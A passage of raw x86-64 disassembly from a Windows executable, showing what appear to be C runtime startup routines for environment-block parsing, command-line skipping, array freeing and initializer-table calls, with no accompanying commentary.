   14000481e:	ff c8                	dec    %eax
   140004820:	48 89 1d 69 47 01 00 	mov    %rbx,0x14769(%rip)        # 0x140018f90
   140004827:	89 05 53 47 01 00    	mov    %eax,0x14753(%rip)        # 0x140018f80
   14000482d:	33 c9                	xor    %ecx,%ecx
   14000482f:	eb 69                	jmp    0x14000489a
   140004831:	48 8d 55 38          	lea    0x38(%rbp),%rdx
   140004835:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140004839:	48 8b cb             	mov    %rbx,%rcx
   14000483c:	e8 53 24 00 00       	call   0x140006c94
   140004841:	8b f0                	mov    %eax,%esi
   140004843:	85 c0                	test   %eax,%eax
   140004845:	74 19                	je     0x140004860
   140004847:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   14000484b:	e8 dc 1d 00 00       	call   0x14000662c
   140004850:	48 8b cb             	mov    %rbx,%rcx
   140004853:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140004857:	e8 d0 1d 00 00       	call   0x14000662c
   14000485c:	8b fe                	mov    %esi,%edi
   14000485e:	eb 3f                	jmp    0x14000489f
   140004860:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   140004864:	48 8b cf             	mov    %rdi,%rcx
   140004867:	48 8b c2             	mov    %rdx,%rax
   14000486a:	48 39 3a             	cmp    %rdi,(%rdx)
   14000486d:	74 0c                	je     0x14000487b
   14000486f:	48 8d 40 08          	lea    0x8(%rax),%rax
   140004873:	48 ff c1             	inc    %rcx
   140004876:	48 39 38             	cmp    %rdi,(%rax)
   140004879:	75 f4                	jne    0x14000486f
   14000487b:	89 0d ff 46 01 00    	mov    %ecx,0x146ff(%rip)        # 0x140018f80
   140004881:	33 c9                	xor    %ecx,%ecx
   140004883:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140004887:	48 89 15 02 47 01 00 	mov    %rdx,0x14702(%rip)        # 0x140018f90
   14000488e:	e8 99 1d 00 00       	call   0x14000662c
   140004893:	48 8b cb             	mov    %rbx,%rcx
   140004896:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   14000489a:	e8 8d 1d 00 00       	call   0x14000662c
   14000489f:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400048a4:	8b c7                	mov    %edi,%eax
   1400048a6:	48 83 c4 30          	add    $0x30,%rsp
   1400048aa:	41 5f                	pop    %r15
   1400048ac:	41 5e                	pop    %r14
   1400048ae:	5f                   	pop    %rdi
   1400048af:	5e                   	pop    %rsi
   1400048b0:	5d                   	pop    %rbp
   1400048b1:	c3                   	ret
   1400048b2:	cc                   	int3
   1400048b3:	cc                   	int3
   1400048b4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400048b9:	57                   	push   %rdi
   1400048ba:	48 83 ec 20          	sub    $0x20,%rsp
   1400048be:	33 ff                	xor    %edi,%edi
   1400048c0:	48 39 3d 21 46 01 00 	cmp    %rdi,0x14621(%rip)        # 0x140018ee8
   1400048c7:	74 04                	je     0x1400048cd
   1400048c9:	33 c0                	xor    %eax,%eax
   1400048cb:	eb 4a                	jmp    0x140004917
   1400048cd:	e8 32 30 00 00       	call   0x140007904
   1400048d2:	48 8b d8             	mov    %rax,%rbx
   1400048d5:	48 85 c0             	test   %rax,%rax
   1400048d8:	75 0c                	jne    0x1400048e6
   1400048da:	33 c9                	xor    %ecx,%ecx
   1400048dc:	e8 4b 1d 00 00       	call   0x14000662c
   1400048e1:	83 c8 ff             	or     $0xffffffff,%eax
   1400048e4:	eb 31                	jmp    0x140004917
   1400048e6:	48 8b cb             	mov    %rbx,%rcx
   1400048e9:	e8 36 00 00 00       	call   0x140004924
   1400048ee:	48 85 c0             	test   %rax,%rax
   1400048f1:	75 05                	jne    0x1400048f8
   1400048f3:	83 cf ff             	or     $0xffffffff,%edi
   1400048f6:	eb 0e                	jmp    0x140004906
   1400048f8:	48 89 05 f1 45 01 00 	mov    %rax,0x145f1(%rip)        # 0x140018ef0
   1400048ff:	48 89 05 e2 45 01 00 	mov    %rax,0x145e2(%rip)        # 0x140018ee8
   140004906:	33 c9                	xor    %ecx,%ecx
   140004908:	e8 1f 1d 00 00       	call   0x14000662c
   14000490d:	48 8b cb             	mov    %rbx,%rcx
   140004910:	e8 17 1d 00 00       	call   0x14000662c
   140004915:	8b c7                	mov    %edi,%eax
   140004917:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000491c:	48 83 c4 20          	add    $0x20,%rsp
   140004920:	5f                   	pop    %rdi
   140004921:	c3                   	ret
   140004922:	cc                   	int3
   140004923:	cc                   	int3
   140004924:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004929:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000492e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140004933:	57                   	push   %rdi
   140004934:	41 56                	push   %r14
   140004936:	41 57                	push   %r15
   140004938:	48 83 ec 30          	sub    $0x30,%rsp
   14000493c:	4c 8b f1             	mov    %rcx,%r14
   14000493f:	33 ed                	xor    %ebp,%ebp
   140004941:	8b cd                	mov    %ebp,%ecx
   140004943:	4d 8b c6             	mov    %r14,%r8
   140004946:	41 0f b7 16          	movzwl (%r14),%edx
   14000494a:	eb 29                	jmp    0x140004975
   14000494c:	66 83 fa 3d          	cmp    $0x3d,%dx
   140004950:	48 8d 41 01          	lea    0x1(%rcx),%rax
   140004954:	48 0f 44 c1          	cmove  %rcx,%rax
   140004958:	48 8b c8             	mov    %rax,%rcx
   14000495b:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   14000495f:	48 ff c0             	inc    %rax
   140004962:	66 41 39 2c 40       	cmp    %bp,(%r8,%rax,2)
   140004967:	75 f6                	jne    0x14000495f
   140004969:	4d 8d 04 40          	lea    (%r8,%rax,2),%r8
   14000496d:	49 83 c0 02          	add    $0x2,%r8
   140004971:	41 0f b7 10          	movzwl (%r8),%edx
   140004975:	66 85 d2             	test   %dx,%dx
   140004978:	75 d2                	jne    0x14000494c
   14000497a:	48 ff c1             	inc    %rcx
   14000497d:	ba 08 00 00 00       	mov    $0x8,%edx
   140004982:	e8 2d 1c 00 00       	call   0x1400065b4
   140004987:	48 8b d8             	mov    %rax,%rbx
   14000498a:	48 85 c0             	test   %rax,%rax
   14000498d:	75 0b                	jne    0x14000499a
   14000498f:	33 c9                	xor    %ecx,%ecx
   140004991:	e8 96 1c 00 00       	call   0x14000662c
   140004996:	33 c0                	xor    %eax,%eax
   140004998:	eb 79                	jmp    0x140004a13
   14000499a:	4c 8b fb             	mov    %rbx,%r15
   14000499d:	41 0f b7 06          	movzwl (%r14),%eax
   1400049a1:	66 85 c0             	test   %ax,%ax
   1400049a4:	74 63                	je     0x140004a09
   1400049a6:	48 83 ce ff          	or     $0xffffffffffffffff,%rsi
   1400049aa:	48 ff c6             	inc    %rsi
   1400049ad:	66 41 39 2c 76       	cmp    %bp,(%r14,%rsi,2)
   1400049b2:	75 f6                	jne    0x1400049aa
   1400049b4:	48 ff c6             	inc    %rsi
   1400049b7:	66 83 f8 3d          	cmp    $0x3d,%ax
   1400049bb:	74 35                	je     0x1400049f2
   1400049bd:	ba 02 00 00 00       	mov    $0x2,%edx
   1400049c2:	48 8b ce             	mov    %rsi,%rcx
   1400049c5:	e8 ea 1b 00 00       	call   0x1400065b4
   1400049ca:	48 8b f8             	mov    %rax,%rdi
   1400049cd:	48 85 c0             	test   %rax,%rax
   1400049d0:	74 26                	je     0x1400049f8
   1400049d2:	4d 8b c6             	mov    %r14,%r8
   1400049d5:	48 8b d6             	mov    %rsi,%rdx
   1400049d8:	48 8b c8             	mov    %rax,%rcx
   1400049db:	e8 c4 19 00 00       	call   0x1400063a4
   1400049e0:	33 c9                	xor    %ecx,%ecx
   1400049e2:	85 c0                	test   %eax,%eax
   1400049e4:	75 46                	jne    0x140004a2c
   1400049e6:	49 89 3f             	mov    %rdi,(%r15)
   1400049e9:	49 83 c7 08          	add    $0x8,%r15
   1400049ed:	e8 3a 1c 00 00       	call   0x14000662c
   1400049f2:	4d 8d 34 76          	lea    (%r14,%rsi,2),%r14
   1400049f6:	eb a5                	jmp    0x14000499d
   1400049f8:	48 8b cb             	mov    %rbx,%rcx
   1400049fb:	e8 40 00 00 00       	call   0x140004a40
   140004a00:	33 c9                	xor    %ecx,%ecx
   140004a02:	e8 25 1c 00 00       	call   0x14000662c
   140004a07:	eb 86                	jmp    0x14000498f
   140004a09:	33 c9                	xor    %ecx,%ecx
   140004a0b:	e8 1c 1c 00 00       	call   0x14000662c
   140004a10:	48 8b c3             	mov    %rbx,%rax
   140004a13:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140004a18:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140004a1d:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   140004a22:	48 83 c4 30          	add    $0x30,%rsp
   140004a26:	41 5f                	pop    %r15
   140004a28:	41 5e                	pop    %r14
   140004a2a:	5f                   	pop    %rdi
   140004a2b:	c3                   	ret
   140004a2c:	45 33 c9             	xor    %r9d,%r9d
   140004a2f:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140004a34:	45 33 c0             	xor    %r8d,%r8d
   140004a37:	33 d2                	xor    %edx,%edx
   140004a39:	e8 1e 19 00 00       	call   0x14000635c
   140004a3e:	cc                   	int3
   140004a3f:	cc                   	int3
   140004a40:	48 85 c9             	test   %rcx,%rcx
   140004a43:	74 3b                	je     0x140004a80
   140004a45:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004a4a:	57                   	push   %rdi
   140004a4b:	48 83 ec 20          	sub    $0x20,%rsp
   140004a4f:	48 8b 01             	mov    (%rcx),%rax
   140004a52:	48 8b d9             	mov    %rcx,%rbx
   140004a55:	48 8b f9             	mov    %rcx,%rdi
   140004a58:	eb 0f                	jmp    0x140004a69
   140004a5a:	48 8b c8             	mov    %rax,%rcx
   140004a5d:	e8 ca 1b 00 00       	call   0x14000662c
   140004a62:	48 8d 7f 08          	lea    0x8(%rdi),%rdi
   140004a66:	48 8b 07             	mov    (%rdi),%rax
   140004a69:	48 85 c0             	test   %rax,%rax
   140004a6c:	75 ec                	jne    0x140004a5a
   140004a6e:	48 8b cb             	mov    %rbx,%rcx
   140004a71:	e8 b6 1b 00 00       	call   0x14000662c
   140004a76:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004a7b:	48 83 c4 20          	add    $0x20,%rsp
   140004a7f:	5f                   	pop    %rdi
   140004a80:	c3                   	ret
   140004a81:	cc                   	int3
   140004a82:	cc                   	int3
   140004a83:	cc                   	int3
   140004a84:	48 83 ec 28          	sub    $0x28,%rsp
   140004a88:	48 8b 09             	mov    (%rcx),%rcx
   140004a8b:	48 3b 0d 66 44 01 00 	cmp    0x14466(%rip),%rcx        # 0x140018ef8
   140004a92:	74 05                	je     0x140004a99
   140004a94:	e8 a7 ff ff ff       	call   0x140004a40
   140004a99:	48 83 c4 28          	add    $0x28,%rsp
   140004a9d:	c3                   	ret
   140004a9e:	cc                   	int3
   140004a9f:	cc                   	int3
   140004aa0:	48 83 ec 28          	sub    $0x28,%rsp
   140004aa4:	48 8b 09             	mov    (%rcx),%rcx
   140004aa7:	48 3b 0d 42 44 01 00 	cmp    0x14442(%rip),%rcx        # 0x140018ef0
   140004aae:	74 05                	je     0x140004ab5
   140004ab0:	e8 8b ff ff ff       	call   0x140004a40
   140004ab5:	48 83 c4 28          	add    $0x28,%rsp
   140004ab9:	c3                   	ret
   140004aba:	cc                   	int3
   140004abb:	cc                   	int3
   140004abc:	48 83 ec 38          	sub    $0x38,%rsp
   140004ac0:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   140004ac7:	ff ff 
   140004ac9:	48 8d 0d 10 44 01 00 	lea    0x14410(%rip),%rcx        # 0x140018ee0
   140004ad0:	e8 af ff ff ff       	call   0x140004a84
   140004ad5:	90                   	nop
   140004ad6:	48 8d 0d 0b 44 01 00 	lea    0x1440b(%rip),%rcx        # 0x140018ee8
   140004add:	e8 be ff ff ff       	call   0x140004aa0
   140004ae2:	90                   	nop
   140004ae3:	48 8b 0d 0e 44 01 00 	mov    0x1440e(%rip),%rcx        # 0x140018ef8
   140004aea:	e8 51 ff ff ff       	call   0x140004a40
   140004aef:	48 8b 0d fa 43 01 00 	mov    0x143fa(%rip),%rcx        # 0x140018ef0
   140004af6:	48 83 c4 38          	add    $0x38,%rsp
   140004afa:	e9 41 ff ff ff       	jmp    0x140004a40
   140004aff:	cc                   	int3
   140004b00:	e9 af fd ff ff       	jmp    0x1400048b4
   140004b05:	cc                   	int3
   140004b06:	cc                   	int3
   140004b07:	cc                   	int3
   140004b08:	48 8b 05 91 44 01 00 	mov    0x14491(%rip),%rax        # 0x140018fa0
   140004b0f:	48 8d 0d ea 43 01 00 	lea    0x143ea(%rip),%rcx        # 0x140018f00
   140004b16:	45 33 c0             	xor    %r8d,%r8d
   140004b19:	48 85 c0             	test   %rax,%rax
   140004b1c:	41 8a d0             	mov    %r8b,%dl
   140004b1f:	48 0f 45 c8          	cmovne %rax,%rcx
   140004b23:	0f b7 01             	movzwl (%rcx),%eax
   140004b26:	66 83 f8 20          	cmp    $0x20,%ax
   140004b2a:	77 09                	ja     0x140004b35
   140004b2c:	66 85 c0             	test   %ax,%ax
   140004b2f:	74 27                	je     0x140004b58
   140004b31:	84 d2                	test   %dl,%dl
   140004b33:	74 11                	je     0x140004b46
   140004b35:	66 83 f8 22          	cmp    $0x22,%ax
   140004b39:	75 05                	jne    0x140004b40
   140004b3b:	84 d2                	test   %dl,%dl
   140004b3d:	0f 94 c2             	sete   %dl
   140004b40:	48 83 c1 02          	add    $0x2,%rcx
   140004b44:	eb dd                	jmp    0x140004b23
   140004b46:	66 83 f8 20          	cmp    $0x20,%ax
   140004b4a:	77 0c                	ja     0x140004b58
   140004b4c:	48 83 c1 02          	add    $0x2,%rcx
   140004b50:	0f b7 01             	movzwl (%rcx),%eax
   140004b53:	66 85 c0             	test   %ax,%ax
   140004b56:	75 ee                	jne    0x140004b46
   140004b58:	48 8b c1             	mov    %rcx,%rax
   140004b5b:	c3                   	ret
   140004b5c:	48 3b ca             	cmp    %rdx,%rcx
   140004b5f:	74 3b                	je     0x140004b9c
   140004b61:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004b66:	57                   	push   %rdi
   140004b67:	48 83 ec 20          	sub    $0x20,%rsp
   140004b6b:	48 8b fa             	mov    %rdx,%rdi
   140004b6e:	48 8b d9             	mov    %rcx,%rbx
   140004b71:	48 8b 03             	mov    (%rbx),%rax
   140004b74:	48 85 c0             	test   %rax,%rax
   140004b77:	74 10                	je     0x140004b89
   140004b79:	49 ba 70 48 da 56 96 	movabs $0x85f13e9656da4870,%r10
   140004b80:	3e f1 85 
   140004b83:	ff 15 df 96 00 00    	call   *0x96df(%rip)        # 0x14000e268
   140004b89:	48 83 c3 08          	add    $0x8,%rbx
   140004b8d:	48 3b df             	cmp    %rdi,%rbx
   140004b90:	75 df                	jne    0x140004b71
   140004b92:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004b97:	48 83 c4 20          	add    $0x20,%rsp
   140004b9b:	5f                   	pop    %rdi
   140004b9c:	c3                   	ret
   140004b9d:	cc                   	int3
   140004b9e:	cc                   	int3
   140004b9f:	cc                   	int3
   140004ba0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004ba5:	57                   	push   %rdi
   140004ba6:	48 83 ec 20          	sub    $0x20,%rsp
   140004baa:	48 8b fa             	mov    %rdx,%rdi
   140004bad:	48 8b d9             	mov    %rcx,%rbx
   140004bb0:	48 3b ca             	cmp    %rdx,%rcx
   140004bb3:	74 25                	je     0x140004bda
   140004bb5:	48 8b 03             	mov    (%rbx),%rax
   140004bb8:	48 85 c0             	test   %rax,%rax
   140004bbb:	74 14                	je     0x140004bd1
   140004bbd:	49 ba 70 30 52 5e 47 	movabs $0xd30527475e523070,%r10
   140004bc4:	27 05 d3 
   140004bc7:	ff 15 9b 96 00 00    	call   *0x969b(%rip)        # 0x14000e268
   140004bcd:	85 c0                	test   %eax,%eax
   140004bcf:	75 0b                	jne    0x140004bdc
   140004bd1:	48 83 c3 08          	add    $0x8,%rbx
   140004bd5:	48 3b df             	cmp    %rdi,%rbx
   140004bd8:	eb d9                	jmp    0x140004bb3
   140004bda:	33 c0                	xor    %eax,%eax
   140004bdc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004be1:	48 83 c4 20          	add    $0x20,%rsp
   140004be5:	5f                   	pop    %rdi
   140004be6:	c3                   	ret
   140004be7:	cc                   	int3
   140004be8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004bed:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140004bf2:	57                   	push   %rdi
   140004bf3:	48 83 ec 20          	sub    $0x20,%rsp
   140004bf7:	49 8b d9             	mov    %r9,%rbx
   140004bfa:	49 8b f8             	mov    %r8,%rdi
   140004bfd:	8b 0a                	mov    (%rdx),%ecx
   140004bff:	e8 e4 2d 00 00       	call   0x1400079e8
   140004c04:	90                   	nop
   140004c05:	48 8b cf             	mov    %rdi,%rcx
   140004c08:	e8 13 00 00 00       	call   0x140004c20
   140004c0d:	90                   	nop
   140004c0e:	8b 0b                	mov    (%rbx),%ecx
   140004c10:	e8 27 2e 00 00       	call   0x140007a3c
   140004c15:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140004c1a:	48 83 c4 20          	add    $0x20,%rsp
   140004c1e:	5f                   	pop    %rdi
   140004c1f:	c3                   	ret
   140004c20:	40 53                	rex push %rbx
   140004c22:	48 83 ec 30          	sub    $0x30,%rsp
   140004c26:	48 8b d9             	mov    %rcx,%rbx
   140004c29:	80 3d e0 42 01 00 00 	cmpb   $0x0,0x142e0(%rip)        # 0x140018f10
   140004c30:	0f 85 a9 00 00 00    	jne    0x140004cdf
   140004c36:	b8 01 00 00 00       	mov    $0x1,%eax
   140004c3b:	87 05 c3 42 01 00    	xchg   %eax,0x142c3(%rip)        # 0x140018f04
   140004c41:	48 8b 01             	mov    (%rcx),%rax
   140004c44:	8b 08                	mov    (%rax),%ecx
   140004c46:	85 c9                	test   %ecx,%ecx
   140004c48:	75 3e                	jne    0x140004c88
   140004c4a:	48 8b 05 ef 33 01 00 	mov    0x133ef(%rip),%rax        # 0x140018040
   140004c51:	48 8b 15 b0 42 01 00 	mov    0x142b0(%rip),%rdx        # 0x140018f08
   140004c58:	48 3b d0             	cmp    %rax,%rdx
   140004c5b:	74 22                	je     0x140004c7f
   140004c5d:	8b c8                	mov    %eax,%ecx
   140004c5f:	83 e1 3f             	and    $0x3f,%ecx
   140004c62:	48 33 c2             	xor    %rdx,%rax
   140004c65:	48 d3 c8             	ror    %cl,%rax
   140004c68:	49 ba 70 28 d9 78 45 	movabs $0x99012e4578d92870,%r10
   140004c6f:	2e 01 99 
   140004c72:	45 33 c0             	xor    %r8d,%r8d
   140004c75:	33 d2                	xor    %edx,%edx
   140004c77:	33 c9                	xor    %ecx,%ecx
   140004c79:	ff 15 e9 95 00 00    	call   *0x95e9(%rip)        # 0x14000e268
   140004c7f:	48 8d 0d 9a 42 01 00 	lea    0x1429a(%rip),%rcx        # 0x140018f20
   140004c86:	eb 0c                	jmp    0x140004c94
   140004c88:	83 f9 01             	cmp    $0x1,%ecx
   140004c8b:	75 0d                	jne    0x140004c9a
   140004c8d:	48 8d 0d a4 42 01 00 	lea    0x142a4(%rip),%rcx        # 0x140018f38
   140004c94:	e8 5b 07 00 00       	call   0x1400053f4
   140004c99:	90                   	nop
   140004c9a:	48 8b 03             	mov    (%rbx),%rax
   140004c9d:	83 38 00             	cmpl   $0x0,(%rax)
   140004ca0:	75 13                	jne    0x140004cb5
   140004ca2:	48 8d 15 57 96 00 00 	lea    0x9657(%rip),%rdx        # 0x14000e300
   140004ca9:	48 8d 0d 30 96 00 00 	lea    0x9630(%rip),%rcx        # 0x14000e2e0
   140004cb0:	e8 a7 fe ff ff       	call   0x140004b5c
   140004cb5:	48 8d 15 54 96 00 00 	lea    0x9654(%rip),%rdx        # 0x14000e310
   140004cbc:	48 8d 0d 45 96 00 00 	lea    0x9645(%rip),%rcx        # 0x14000e308
   140004cc3:	e8 94 fe ff ff       	call   0x140004b5c
   140004cc8:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140004ccc:	83 38 00             	cmpl   $0x0,(%rax)
   140004ccf:	75 0e                	jne    0x140004cdf
   140004cd1:	c6 05 38 42 01 00 01 	movb   $0x1,0x14238(%rip)        # 0x140018f10
   140004cd8:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140004cdc:	c6 00 01             	movb   $0x1,(%rax)
   140004cdf:	48 83 c4 30          	add    $0x30,%rsp
   140004ce3:	5b                   	pop    %rbx
   140004ce4:	c3                   	ret
   140004ce5:	e8 36 09 00 00       	call   0x140005620
   140004cea:	90                   	nop
   140004ceb:	cc                   	int3
   140004cec:	44 89 44 24 18       	mov    %r8d,0x18(%rsp)
   140004cf1:	89 54 24 10          	mov    %edx,0x10(%rsp)
   140004cf5:	55                   	push   %rbp
   140004cf6:	48 8b ec             	mov    %rsp,%rbp
   140004cf9:	48 83 ec 50          	sub    $0x50,%rsp
   140004cfd:	48 c7 45 e0 fe ff ff 	movq   $0xfffffffffffffffe,-0x20(%rbp)
   140004d04:	ff 
   140004d05:	48 89 5c 24 60       	mov    %rbx,0x60(%rsp)
   140004d0a:	8b d9                	mov    %ecx,%ebx
   140004d0c:	45 85 c0             	test   %r8d,%r8d
   140004d0f:	75 4a                	jne    0x140004d5b
   140004d11:	33 c9                	xor    %ecx,%ecx
   140004d13:	ff 15 5f 93 00 00    	call   *0x935f(%rip)        # 0x14000e078
   140004d19:	48 85 c0             	test   %rax,%rax
